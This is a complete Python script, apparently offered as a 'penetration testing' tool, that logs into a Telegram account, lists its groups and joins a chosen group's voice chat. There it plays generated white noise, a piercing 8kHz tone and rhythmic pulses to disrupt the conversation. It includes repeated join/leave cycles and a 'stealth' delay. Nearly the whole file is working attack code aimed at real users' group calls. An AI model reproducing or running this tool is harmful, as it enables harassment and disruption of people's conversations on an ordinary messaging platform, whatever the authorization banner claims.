#!/usr/bin/env python3
"""
Telegram VC Audio Flooder — Disruptor de Voice Chat
Authorized Penetration Testing Tool
Uso: python tg_vc_audio_flood.py

Recursos:
  - Gera ruído branco + tons de alta frequência (8kHz) para disruptir áudio
  - Faz join no Voice Chat e transmite o áudio disruptivo em loop
  - Suporta múltiplos ciclos de join/leave para maior impacto
  - Modo stealth opcional (delay antes de começar a tocar)
"""

import asyncio
import io
import time
import random
import sys
import wave
import numpy as np
from pyrogram import Client
from pytgcalls import PyTgCalls
from pytgcalls.types import AudioPiped, AudioVideoPiped
from pytgcalls.types.stream import StreamAudioEnded

# ═══════════════════════════════════════════════════
# CONFIGURAÇÃO — Altere com seus dados
# ═══════════════════════════════════════════════════
API_ID = 1234567          # De my.telegram.org/apps
API_HASH = "abc123def456" # De my.telegram.org/apps
PHONE_NUMBER = "+5500111111111"  # Seu número com DDI

# ═══════════════════════════════════════════════════
# PARÂMETROS DO ATAQUE
# ═══════════════════════════════════════════════════
NOISE_DURATION_SEC = 15       # Duração do áudio disruptivo gerado (segundos)
SAMPLE_RATE = 48000           # Taxa de amostragem (Hz)
NOISE_AMPLITUDE = 0.9         # Volume do ruído (0.0 a 1.0)
TONE_FREQUENCY = 8000         # Frequência do tom irritante (Hz)
TONE_AMPLITUDE = 0.4          # Volume do tom
STEALTH_MODE = False          # Se True, espera 5s antes de começar a tocar
LOOP_COUNT = 1                # Quantas vezes entrar/tocar (1 = uma vez)
RECONNECT_DELAY = 3           # Delay entre reconexões (segundos)

# ═══════════════════════════════════════════════════

def generate_disruptive_audio(duration_sec=NOISE_DURATION_SEC,
                               sample_rate=SAMPLE_RATE,
                               noise_amp=NOISE_AMPLITUDE,
                               tone_freq=TONE_FREQUENCY,
                               tone_amp=TONE_AMPLITUDE):
    """
    Gera áudio WAV em memória com:
    - Ruído branco (white noise) para causar interferência
    - Tom senoidal de alta frequência (irritante/desagradável)
    - Pulsos rítmicos para maximizar o incômodo
    """
    samples = int(duration_sec * sample_rate)
    t = np.linspace(0, duration_sec, samples, endpoint=False)

    # Ruído branco (broad spectrum)
    noise = np.random.normal(0, noise_amp, samples).astype(np.float32)

    # Tom de alta frequência (8kHz — desagradável ao ouvido)
    tone = tone_amp * np.sin(2 * np.pi * tone_freq * t)

    # Pulsos rítmicos — batidas rápidas para quebrar o áudio
    pulse_rate = 15  # Hz
    pulse = 0.3 * (0.5 + 0.5 * np.sin(2 * np.pi * pulse_rate * t))

    # Mixagem
    mixed = noise + tone + pulse

    # Evita clipping
    mixed = np.clip(mixed, -1.0, 1.0)

    # Converte para 16-bit PCM
    pcm_data = (mixed * 32767).astype(np.int16)

    # Escreve em buffer WAV na memória
    buf = io.BytesIO()
    with wave.open(buf, 'wb') as wf:
        wf.setnchannels(1)           # Mono
        wf.setsampwidth(2)           # 16-bit
        wf.setframerate(sample_rate) # 48kHz
        wf.writeframes(pcm_data.tobytes())

    buf.seek(0)
    return buf


async def find_target_chat(app):
    """
    Lista grupos disponíveis e retorna o chat_id escolhido.
    """
    print("\n[🔍] Escaneando chats disponíveis...\n")
    groups = []

    async for dialog in app.get_dialogs():
        chat = dialog.chat
        if chat.type in ("group", "supergroup"):
            title = chat.title or "(sem título)"
            print(f"  📁 [{len(groups)}] {title} | ID: {chat.id}")
            groups.append(chat)

    if not groups:
        print("[!] Nenhum grupo encontrado.")
        sys.exit(1)

    try:
        choice = int(input("\n[?] Escolha o número do grupo alvo: "))
        target = groups[choice]
        print(f"\n[✓] Alvo selecionado: {target.title} (ID: {target.id})")
        return target.id
    except (ValueError, IndexError):
        print("[!] Opção inválida.")
        sys.exit(1)


async def disrupt_voice_chat(pytgcalls, chat_id, loop=LOOP_COUNT):
    """
    Entra no Voice Chat e toca o áudio disruptivo.
    """
    # Gera o áudio uma vez (reutilizável)
    audio_buf = generate_disruptive_audio()

    for i in range(loop):
        print(f"\n[⚡] Ciclo {i+1}/{loop} — Entrando no Voice Chat...")

        try:
            # Modo stealth: espera alguns segundos antes de começar
            if STEALTH_MODE and i == 0:
                wait_time = random.uniform(3, 8)
                print(f"[🕒] Modo stealth ativado — esperando {wait_time:.1f}s...")
                await asyncio.sleep(wait_time)

            await pytgcalls.join_group_call(
                chat_id,
                AudioPiped(audio_buf)
            )

            print(f"[✅] DENTRO DO VC! Tocando áudio disruptivo...")
            print(f"     Amostras: {SAMPLE_RATE}Hz | Ruído: {NOISE_AMPLITUDE} | Tom: {TONE_FREQUENCY}Hz")

            # Tempo de duração + margem
            await asyncio.sleep(NOISE_DURATION_SEC + 2)

            # Sai do VC
            await pytgcalls.leave_group_call(chat_id)
            print(f"[⏏️] Saiu do Voice Chat (ciclo {i+1})")

            # Se não for o último ciclo, espera antes de reconectar
            if i < loop - 1:
                print(f"[⏳] Aguardando {RECONNECT_DELAY}s para próximo ciclo...")
                await asyncio.sleep(RECONNECT_DELAY)

        except Exception as e:
            print(f"[❌] Erro no ciclo {i+1}: {e}")
            # Tenta sair se preso
            try:
                await pytgcalls.leave_group_call(chat_id)
            except:
                pass
            await asyncio.sleep(2)

    print("\n[🏁] Todos os ciclos concluídos.")


async def main():
    print(r"""
    ╔══════════════════════════════════════════════════════╗
    ║         Telegram VC Audio Flooder v2.0              ║
    ║        🔬 Authorized Penetration Testing           ║
    ║     Use apenas em alvos com permissão explícita    ║
    ╚══════════════════════════════════════════════════════╝
    """)

    # Verifica configurações
    if API_ID == 1234567 or API_HASH == "abc123def456":
        print("[!] Configure API_ID e API_HASH primeiro!")
        print("    Obtenha em: https://my.telegram.org/apps")
        sys.exit(1)

    # Inicializa cliente Pyrogram
    app = Client("pyro_vc_session", api_id=API_ID,
                 api_hash=API_HASH, phone_number=PHONE_NUMBER)

    print("[📡] Conectando ao Telegram...")
    await app.start()

    user = await app.get_me()
    print(f"[👤] Logado como: {user.first_name} (ID: {user.id})")

    # Inicializa PyTgCalls
    pytgcalls = PyTgCalls(app)
    await pytgcalls.start()
    print("[📞] PyTgCalls inicializado!")

    # Encontra alvo
    chat_id = await find_target_chat(app)

    # Mostra resumo antes de executar
    print(f"\n{'='*50}")
    print(f"  RESUMO DO TESTE:")
    print(f"  ├ Alvo:           Chat ID {chat_id}")
    print(f"  ├ Tipo:           Disrupção de Voice Chat")
    print(f"  ├ Duração áudio:  {NOISE_DURATION_SEC}s")
    print(f"  ├ Ciclos:         {LOOP_COUNT}")
    print(f"  ├ Stealth mode:   {'Sim' if STEALTH_MODE else 'Não'}")
    print(f"  ├ Frequência tom: {TONE_FREQUENCY}Hz")
    print(f"  └ Volume ruído:   {int(NOISE_AMPLITUDE*100)}%")
    print(f"{'='*50}")

    confirm = input("\n[?] Iniciar ataque? (s/N): ")
    if confirm.lower() != 's':
        print("[✋] Cancelado pelo usuário.")
        await app.stop()
        sys.exit(0)

    # Executa a disrupção
    await disrupt_voice_chat(pytgcalls, chat_id)

    # Finaliza
    await pytgcalls.stop()
    await app.stop()
    print("\n[✅] Teste concluído. Documente os resultados.\n")


if __name__ == "__main__":
    asyncio.run(main())
